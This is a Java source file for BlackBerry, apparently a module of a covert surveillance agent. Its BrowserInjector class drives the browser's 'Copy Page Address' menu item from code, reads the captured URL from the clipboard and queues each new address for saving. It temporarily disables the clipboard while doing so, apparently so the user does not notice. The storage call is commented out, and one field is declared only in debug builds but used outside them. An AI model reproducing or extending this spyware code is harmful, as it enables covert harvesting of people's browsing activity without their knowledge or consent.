package blackberry.injection.injectors;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;

public class BrowserInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserInjector",
            DebugLevel.VERBOSE);
    private Object lastUrl;

    //#endif

    public String getAppName() {
        return "Browser";
    }

    public String getCodName() {
        //return "net.rim.device.apps.internal.browser.core.BrowserImpl";
        return "net_rim_bb_browser_daemon";
        //return "net.rim.java.browser";
    }

    public String[] getWantedScreen() {
        return new String[] { "net.rim.device.apps.internal.browser.ui.BrowserScreen" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif    

        disableClipboard();
        boolean ret = MenuWalker.walk("Copy Page Address", screen, true);

        if (ret) {

            String url = (String) Clipboard.getClipboard().get();
            setClipboard(url);
            if (url != null) {
                //#ifdef DEBUG
                debug.trace("playOnScreen, URL FOUND:" + url);
                //#endif
                if (!url.equals(lastUrl)) {
                    lastUrl = url;
                    //#ifdef DEBUG
                    debug.info("NEW URL: " + url);
                    //#endif

                    saveUrl(url);
                } else {
                    //#ifdef DEBUG
                    debug.trace("playOnScreen: same url");
                    //#endif
                }
            }
        } else {
            //#ifdef DEBUG
            debug.error("playOnScreen: no Copy Address, wrong screen");
            //#endif

        }
        enableClipboard();
    }

    private void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl");
        //#endif
        
        //ModuleUrl.getInstance.saveUrl(url);
    }

}
